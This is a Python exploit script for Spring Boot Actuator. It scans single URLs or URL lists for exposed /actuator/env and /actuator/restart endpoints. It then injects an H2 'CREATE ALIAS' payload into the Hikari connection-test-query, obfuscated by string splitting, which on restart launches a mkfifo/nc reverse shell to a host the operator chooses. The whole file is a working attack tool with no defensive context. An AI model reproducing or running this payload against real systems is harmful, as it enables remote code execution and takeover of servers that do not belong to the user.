import requests
import optparse
import os
from multiprocessing import Pool

payload='''{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS IF NOT EXISTS EXEC AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL EXEC('/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP1 PORT1 >/tmp/f');"}'''
headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
         "Content-Type":"application/json"}
path=["/actuator/env","/actuator/restart"]
result=[]
ip=None
port=None

def reverseshell(url):
    headers["Content-Type"]="application/json"
    try:
        rqt=requests.post(url=url.rstrip("/")+path[0],headers=headers,data=payload.replace("IP1",ip).replace("PORT1",port),verify=False,timeout=5)
        if rqt.status_code==200:
            print("[+] sned post ok")
            rqt2=requests.post(url=url.rstrip("/")+path[1],headers=headers,data="{}",verify=False,timeout=5)
            if rqt2.text=='''{"message":"Restarting"}''' or rqt.status_code==200:
                print("[*] the payload is send----->,check shell")
        else:
            print("[-] payload failure:{}".format(url))
    except:
        pass

def check(url,id):
    try:
        rqt=requests.post(url=url.rstrip("/")+path[0],headers=headers,data="{}",verify=False,timeout=5) #env路径检测
        if rqt.status_code==400:
            print("[+] found env path is post request ok! the url:{}".format(url.rstrip("/")+path[0]))
            del headers["Content-Type"]
            rqt2=requests.get(url=url.rstrip("/")+path[1],headers=headers,verify=False,timeout=5)
            if rqt2.status_code==405:
                print("[+] found restart path is post request ok! the url:{}".format(url.rstrip("/")+path[1]))
                print(url,file=open("ok.txt","a",encoding="utf-8"))
                if id==1:
                    reverseshell(url)
            else:
                print("[-] the restart path is post failure-the url:{}".format(url))
        else:
            print("[-] the env path post request failure-the url:{}".format(url))
    except:
        pass

if __name__ == '__main__':
    parser=optparse.OptionParser()
    parser.add_option("-u",dest="url",help="set url")
    parser.add_option("-f",dest="file",help="set file (Only supports detection)")
    parser.add_option("-i",dest="id",help="the id 0 is check/the id 1 is shell")
    parser.add_option("-I",dest="ip",help="RHOST")
    parser.add_option("-P",dest="port",help="RPORT")
    (option,args)=parser.parse_args()
    if option.url and option.id:
        if option.ip !=None and option.port!=None:
            ip=option.ip
            port=option.port
        if int(option.id)==1 and ip==None:
            print("[-] please set RHOST and RPORT")
            exit()
        check(option.url,int(option.id))
    elif option.file and option.id:
        id=int(option.id)
        if id==0:
            if os.path.exists(option.file):
                urllist=open(option.file,"r",encoding="utf-8").read().split("\n")
                P=Pool(processes=50)
                for url in urllist:
                    result.append(P.apply_async(check, args=(url,0)))
                P.close()
                P.join()

            for res in result:
                output=res.get()
                if output!=None:
                    print(output)


    else:
        print("usage:\npython exp.py -u <url> -i 0 #check\npyhon exp.py -u <url> -i 1 -I <IP> -P <PORT>#reverseshell\npython exp.py -f <file> -i 0#check url list")
        parser.print_help()